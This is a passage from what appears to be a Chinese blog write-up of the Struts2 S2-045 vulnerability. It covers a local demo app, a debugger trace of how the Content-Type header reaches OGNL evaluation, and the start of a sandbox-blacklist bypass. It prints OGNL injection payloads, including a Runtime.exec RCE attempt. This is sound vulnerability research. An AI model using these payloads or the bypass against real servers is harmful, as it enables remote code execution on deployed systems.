+<h3 id="src-main-resources-struts-xml"><a href="#src-main-resources-struts-xml" class="headerlink" title="src&#x2F;main&#x2F;resources&#x2F;struts.xml"></a>src&#x2F;main&#x2F;resources&#x2F;struts.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">struts</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 指定文件上传解析器用 Jakarta，漏洞触发点就在这个解析器里 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Struts2 有两个解析器可选：jakarta 和 cos，默认就是 jakarta --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 这里显式声明一下，换成 cos 的话漏洞就触发不了 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.multipart.parser&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jakarta&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- namespace=&quot;/&quot; 表示根路径，extends=&quot;struts-default&quot; 继承默认配置 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 里面包含了一堆拦截器，文件上传相关的拦截器也在里面 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.UploadAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- execute() 返回 SUCCESS 跳这里 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/upload.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- input 这个 result 比较关键 --&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- Jakarta 解析器抛异常后 Struts2 会把请求导向 input 结果 --&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 在这个过程中才触发了错误消息的 OGNL 求值 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span>&gt;</span>/upload.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="UploadAction-java"><a href="#UploadAction-java" class="headerlink" title="UploadAction.java"></a>UploadAction.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承 ActionSupport，拿到默认的 execute()、validate() 等基础实现</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> File upload;               <span class="comment">// 接收文件本体，名字对应表单的 name=&quot;upload&quot;</span></span><br><span class="line">    <span class="keyword">private</span> String uploadFileName;     <span class="comment">// 接收原始文件名，命名规则固定：字段名+FileName</span></span><br><span class="line">    <span class="keyword">private</span> String uploadContentType;  <span class="comment">// 接收文件的 MIME 类型，命名规则固定：字段名+ContentType</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 啥都不干，直接返回 SUCCESS 跳到 upload.jsp，够触发漏洞就行</span></span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面全是标准 getter/setter，fileUpload 拦截器靠反射调这些 setter 注入数据</span></span><br><span class="line">    <span class="keyword">public</span> File <span class="title function_">getUpload</span><span class="params">()</span> &#123; <span class="keyword">return</span> upload; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUpload</span><span class="params">(File upload)</span> &#123; <span class="built_in">this</span>.upload = upload; &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadFileName</span><span class="params">()</span> &#123; <span class="keyword">return</span> uploadFileName; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadFileName</span><span class="params">(String uploadFileName)</span> &#123; <span class="built_in">this</span>.uploadFileName = uploadFileName; &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadContentType</span><span class="params">()</span> &#123; <span class="keyword">return</span> uploadContentType; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadContentType</span><span class="params">(String uploadContentType)</span> &#123; <span class="built_in">this</span>.uploadContentType = uploadContentType; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>核心就一点：这个类本身没有任何业务逻辑，就是一个空壳，作用是让 <code>fileUpload</code> 拦截器能通过反射找到对应的 setter 完成注入。<strong>漏洞在拦截器执行之前就已经触发了，跟这个 Action 里写什么没有关系。</strong></p>
+<h3 id="upload-jsp"><a href="#upload-jsp" class="headerlink" title="upload.jsp"></a>upload.jsp</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- 提交到 /upload，对应 struts.xml 里 name=<span class="string">&quot;upload&quot;</span> 的 Action --&gt;</span><br><span class="line">&lt;!-- 文件上传必须用 POST --&gt;</span><br><span class="line">&lt;!-- 关键：告诉浏览器用 multipart 格式编码，Struts2 才会用 Jakarta 解析器处理 --&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;/upload&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;!-- name=<span class="string">&quot;upload&quot;</span> 对应 Action 里的 upload 字段 --&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upload&quot;</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最关键的是 <code>enctype=&quot;multipart/form-data&quot;</code>，没有这个请求就是普通表单，<code>Content-Type</code> 就是 <code>application/x-www-form-urlencoded</code>，Jakarta 解析器不会介入，漏洞触发不了。</p>
+<p>访问 <code>http://localhost:8080/upload.jsp</code>，显示正常的表单界面：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_lxfy.png"></p>
+<hr>
+<h2 id="正常请求流程梳理"><a href="#正常请求流程梳理" class="headerlink" title="正常请求流程梳理"></a>正常请求流程梳理</h2><p>先把正常请求的完整调用链搞清楚，这样后面看漏洞触发点的时候就知道是哪里出了问题。</p>
+<p><code>struts-default.xml</code> 里有自带的拦截器栈：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_djyw.png"></p>
+<p>正常一次文件上传请求的完整流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">浏览器访问 http://localhost:8080/upload.jsp</span><br><span class="line">        ↓</span><br><span class="line">    upload.jsp 显示上传表单</span><br><span class="line">        ↓</span><br><span class="line">    点击上传，表单提交到 action=&quot;upload&quot;</span><br><span class="line">        ↓</span><br><span class="line">    web.xml 里 StrutsPrepareAndExecuteFilter 拦截所有请求 /*</span><br><span class="line">        ↓</span><br><span class="line">    检测请求头 Content-Type 包含 multipart/form-data</span><br><span class="line">        ↓</span><br><span class="line">    包装成 MultiPartRequestWrapper，同时调用 JakartaMultiPartRequest.parse() 解析文件</span><br><span class="line">        ↓</span><br><span class="line">    struts.xml 里找到 name=&quot;upload&quot; 对应 com.demo.UploadAction</span><br><span class="line">        ↓</span><br><span class="line">    按顺序执行 defaultStack 拦截器栈</span><br><span class="line">        ↓</span><br><span class="line">    fileUpload 拦截器检测到是 MultiPartRequestWrapper</span><br><span class="line">        ↓</span><br><span class="line">    反射找 Action 里的 setUpload()、setUploadFileName()、setUploadContentType()</span><br><span class="line">        ↓</span><br><span class="line">    把解析好的文件数据注入到对应字段</span><br><span class="line">        ↓</span><br><span class="line">    UploadAction.execute() 返回 SUCCESS</span><br><span class="line">        ↓</span><br><span class="line">    struts.xml 里 result name=&quot;success&quot; 指向 /upload.jsp</span><br><span class="line">        ↓</span><br><span class="line">    回到 upload.jsp</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="调试验证-OGNL-执行"><a href="#调试验证-OGNL-执行" class="headerlink" title="调试验证 OGNL 执行"></a>调试验证 OGNL 执行</h2><h3 id="先确认-OGNL-表达式确实被执行了"><a href="#先确认-OGNL-表达式确实被执行了" class="headerlink" title="先确认 OGNL 表达式确实被执行了"></a>先确认 OGNL 表达式确实被执行了</h3><p>修改数据包，把 <code>Content-Type</code> 改成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;1+1&#125; multipart/form-data</span><br></pre></td></tr></table></figure>
+
+<p>因为直接这样看不到回显，需要在 jsp 里面添加：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;s&quot;</span> uri=<span class="string">&quot;/struts-tags&quot;</span> %&gt;</span><br><span class="line">&lt;s:actionerror/&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;s:actionerror/&gt;</code> 的作用是把 <code>ActionError</code> 里的内容渲染到页面上：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_ttsz.png"></p>
+<p>然后就看到返回包里包含计算结果 2：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_sfx1.png"></p>
+<p>表达式被 OGNL 成功执行了，这里漏洞验证完毕。</p>
+<hr>
+<h2 id="源码调用栈分析"><a href="#源码调用栈分析" class="headerlink" title="源码调用栈分析"></a>源码调用栈分析</h2><p>还是先根据 <code>web.xml</code> 里的 Struts2 监听器 <code>StrutsPrepareAndExecuteFilter</code> 里的 <code>doFilter</code> 为入口断点：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_hdhp.png"></p>
+<p>在这里面，进入 <code>request = prepare.wrapRequest(request)</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_8fdo.png"></p>
+<p>进入 <code>request = dispatcher.wrapRequest(request)</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_98kw.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">content_type</span> <span class="operator">=</span> request.getContentType();</span><br></pre></td></tr></table></figure>
+
+<p>取出了请求包里的 <code>ContentType</code>，这里也就是 <code>%&#123;1+1&#125; multipart/form-data</code>。</p>
+<p>接着是：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (content_type != <span class="literal">null</span> &amp;&amp; content_type.contains(<span class="string">&quot;multipart/form-data&quot;</span>)) &#123;</span><br></pre></td></tr></table></figure>
+
+<p>判断 <code>Content-Type</code> 是否包含 <code>multipart/form-data</code>。<strong>注意这里是直接判断是否包含字段，而不是严格比对</strong>，所以 <code>%&#123;1+1&#125; multipart/form-data</code> 也能通过这个检测。</p>
+<p>然后进入：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request = <span class="keyword">new</span> <span class="title class_">MultiPartRequestWrapper</span>(mpr, request, getSaveDir(), provider, disableRequestAttributeValueStackLookup);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_aupd.png"></p>
+<p>进入 <code>multi.parse(request, saveDir)</code>，我们的表达式还在 request 里面，<code>saveDir</code> 是保存的临时路径。</p>
+<p><code>parse</code> 里就是检测格式的地方：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_cu66.png"></p>
+<p>明显格式不对，所以会抛出异常：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_3cw7.png"></p>
+<p>这整个异常信息里带着我们的 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content type header is %&#123;1+1&#125; multipart/form-data</span><br></pre></td></tr></table></figure>
+
+<p>这个 <code>e.getMessage()</code> 的值就是这整串字符串，接下来会被传进 <code>buildErrorMessage()</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> buildErrorMessage(e, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_drj1.png"></p>
+<p>这里面返回了 <code>LocalizedTextUtil.findText</code>，其中参数 <code>e</code> 就是包含 payload 的错误信息：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_z41s.png"></p>
+<p>然后进入另一个 <code>findText</code> 方法，这里 <code>defaultMessage</code> 是错误信息：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_65tz.png"></p>
+<p>经过一段非常长的查找，最后 <code>indexedTextName</code> 还是 null，进入：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = getDefaultMessage(aTextName, locale, valueStack, args, defaultMessage);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512170040302.png"></p>
+<p>这里 <code>aTextName</code> 是 <code>struts.messages.upload.error.InvalidContentTypeException</code>（错误信息里截取的部分），<code>defaultMessage</code> 是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">the request doesn&#x27;t contain a multipart/form-data or multipart/mixed stream,</span><br><span class="line">content type header is %&#123;1+1&#125; multipart/form-data</span><br></pre></td></tr></table></figure>
+
+<p>错误信息的另一部分，也包含了我们的表达式。</p>
+<p>然后来到下面这行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MessageFormat</span> <span class="variable">mf</span> <span class="operator">=</span> buildMessageFormat(TextParseUtil.translateVariables(message, valueStack), locale);</span><br></pre></td></tr></table></figure>
+
+<p><code>buildMessageFormat</code> 只是把结果格式化成消息，不重要。<strong>重点是 <code>TextParseUtil.translateVariables(message, valueStack)</code>，这个就是会处理并计算 OGNL 表达式的地方。</strong></p>
+<blockquote>
+<p><strong>注意</strong>：断点进入时不要直接进入，会默认进入 <code>buildMessageFormat</code> 方法，需要手动点击进入 <code>translateVariables</code> 方法里面。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_6wto.png"></p>
+<p>进入看到了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_m5wv.png"></p>
+<p>这和之前看 S2-016 代码审计看到的是一样的，都是 OGNL 的处理逻辑——把表达式 <code>%&#123;&#125;</code> 里的内容提取出来，然后进入 OGNL 计算，得出 <code>2</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_7a91.png"></p>
+<h3 id="漏洞根因总结"><a href="#漏洞根因总结" class="headerlink" title="漏洞根因总结"></a>漏洞根因总结</h3><p>这整体看来基本和 S2-016 一样，只不过触发点不一样。代码会对 <code>Content-Type</code> 里的内容检测是否包含 <code>multipart</code> 字段，但后面的内容格式不对从而触发了异常抛出，而这个异常抛出会经过 OGNL 的检测计算逻辑，导致触发了漏洞。</p>
+<p>S2-045 这个案例特别典型，因为它利用的是错误处理逻辑——开发者压根没想到异常消息也是用户可控的，防御意识完全没有覆盖到这里，这也是为什么这类漏洞危害这么大。</p>
+<blockquote>
+<p><strong>补充：为什么连错误、异常都要经过 OGNL 检测？</strong></p>
+<p>这是 Struts2 的国际化机制设计导致的，不是专门针对错误消息做 OGNL 求值，而是所有文本消息统一走这一套处理流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">任何要显示给用户的文本</span><br><span class="line">    → 统一走 LocalizedTextUtil.findText()</span><br><span class="line">        → 统一走 getDefaultMessage()</span><br><span class="line">            → 统一走 TextParseUtil.translateVariables()</span><br><span class="line">                → 统一做 OGNL 求值</span><br></pre></td></tr></table></figure>
+
+<p>设计者本来想的是把错误信息做成国际化友好的提示，比如把<code>文件 test.jpg 上传失败，大小超过 10MB</code>这种可读的消息渲染出来，而不是直接甩一堆 Java 异常堆栈给用户看。一个美化 UI 的小功能，变成了高危 RCE，挺经典的安全反例。</p>
+</blockquote>
+<hr>
+<h2 id="沙箱机制与绕过过程"><a href="#沙箱机制与绕过过程" class="headerlink" title="沙箱机制与绕过过程"></a>沙箱机制与绕过过程</h2><h3 id="第一步：直接-RCE-尝试，失败"><a href="#第一步：直接-RCE-尝试，失败" class="headerlink" title="第一步：直接 RCE 尝试，失败"></a>第一步：直接 RCE 尝试，失败</h3><p><code>1+1</code> 证明了确实有漏洞，尝试构造 RCE 代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;)&#125;multipart/form-data</span><br></pre></td></tr></table></figure>
+
+<p>但是 calc 并没有执行：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_h710.png"></p>
+<p>调试一下看看具体是哪里出了问题。</p>
+<p>可以看到 payload 依然被正常提取出来了，没有被拦截：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_kcds.png"></p>
+<p>在这里可以看到传入的 <code>var</code> 是正常的 payload，但是返回的值却是 null：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_oxry.png"></p>
+<p>说明 OGNL 里的检测肯定没有通过，检测机制在这里面：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_a2rs.png"></p>
+<p>然后断点进入：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_v42a.png"></p>
+<p>然后是 <code>node.getValue</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_1rmn.png"></p>
+<p>然后这里的 <code>_hasConstantValue</code> 是 false，进入 <code>getValueBody(context, source)</code>，一大段都是处理索引属性的特殊情况：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_0ax2.png"></p>
+<p>来到最后一段的 <code>_children[i].getValue()</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_pu9y.png"></p>
+<p>然后就是又来到了这里，这似乎是因为 AST 树是嵌套的，每一层节点都要经过这个方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ASTChain.getValueBody()             ← 第一次，处理整个链式调用</span><br><span class="line">    → _children[0].getValue()</span><br><span class="line">        → ASTStaticMethod.getValueBody()  ← 第二次，处理 @Runtime@getRuntime()</span><br><span class="line">            → _children[0].getValue()</span><br><span class="line">                → ASTMethod.getValueBody()  ← 第三次，处理 exec(&#x27;calc&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>就像俄罗斯套娃，外层节点调用内层节点，每层都要走一遍 <code>evaluateGetValueBody</code>，payload 被一层层拆解执行，直到最里层才真正触发方法调用和 <code>isAccessible()</code> 检查。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_ojdj.png"></p>
+<p>然后在这个 <code>getValueBody</code> 方法里面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_1e0e.png"></p>
+<p>payload 的参数方法被拆解了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_8axd.png"></p>
+<p><code>callStaticMethod</code> 里：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_onen.png"></p>
+<p>然后就是 <code>ma.callStaticMethod(context, targetClass, methodName, args)</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_7xvo.png"></p>
+<p>这里是拦截点，判断 <code>DENY_METHOD_EXECUTION</code> 这个 flag。<code>exec: null，e: false</code>，走进了 <code>if (!e)</code> 分支，方法执行没有被拦截。</p>
+<p>继续跟进 <code>callStaticMethodWithDebugInfo()</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_zyp6.png"></p>
+<p>进入，<code>super.callStaticMethod</code> 查找方法，相当于找到 <code>getRuntime()</code> 这个方法对象：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_y1da.png"></p>
+<p>跟进 <code>callAppropriateMethod()</code>，看到了 <code>isMethodAccessible()</code>，如果没有通过就会直接抛出异常，不继续执行下面的代码，通过了才走到 <code>invokeMethod()</code> 真正执行 <code>getRuntime()</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_uec7.png"></p>
+<p>而 <code>isMethodAccessible()</code> 就是沙箱检查，必须通过才能继续：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_tqp1.png"></p>
+<p>进入看看：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_jlub.png"></p>
+<p>再次进入：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_c7he.png"></p>
+<p>最后发现只有一个 <code>return _memberAccess</code>，而 <code>_memberAccess</code> 不是一个普通的参数，而是一个对象。<code>.getMemberAccess()</code> 之后就是 <code>.isAccessible()</code>，这里是真正的检测方法。</p>
+<p>这两段拿到这两个 Class 对象用来后面的黑名单对比：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_i49y.png"></p>
+<p>三个检测：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_oqtr.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一个：检查包名黑名单，比如 java.lang、ognl 这些包是否被禁止</span></span><br><span class="line"><span class="comment">// 第二个：检查调用者的类是否在黑名单里，比如 Runtime.class</span></span><br><span class="line"><span class="comment">// 第三个：检查方法声明所在的类是否在黑名单里，比如 Runtime.class</span></span><br></pre></td></tr></table></figure>
+
+<p>三个都没拦截才能走到最后：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_tfwh.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父类的基础访问检查，比如 private/public 修饰符</span></span><br></pre></td></tr></table></figure>
+
+<p>先看看会不会被检测到。<code>isPackageExcluded</code> 这个方法里面有两个检测，第一个没有检测到，但是第二个检测到了，被拦截了，这就是 RCE 没有正常执行的原因：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_j0o3.png"></p>
+<p>这是对三个黑名单的检测</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_w4ms.png"></p>
+<hr>
+<h3 id="第二步：尝试-clear-清空黑名单"><a href="#第二步：尝试-clear-清空黑名单" class="headerlink" title="第二步：尝试 clear() 清空黑名单"></a>第二步：尝试 clear() 清空黑名单</h3><p>针对这三个黑名单的检测，一般的审计都是要分析具体是什么被检测了、黑名单是什么。但是这个 payload 绕过不一样，非常暴力，直接把黑名单清空。</p>
+<p>问题是：为什么能把黑名单清空，这个思路是怎么发现的？</p>
+<p>在 <code>SecurityMemberAccess</code> 这个类里面有个 set 方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_2bld.png"></p>
+<p>那是不是意味着可以直接 set 一个空的内容给黑名单？</p>
+<p>理论上可以，但实际上不行，因为在 payload 里面是拿不到 <code>SecurityMemberAccess</code> 这个对象的。</p>
+<p><code>SecurityMemberAccess</code> 没有注册到 Struts2 的 IoC 容器里，<code>OgnlUtil</code> 注册了：</p>
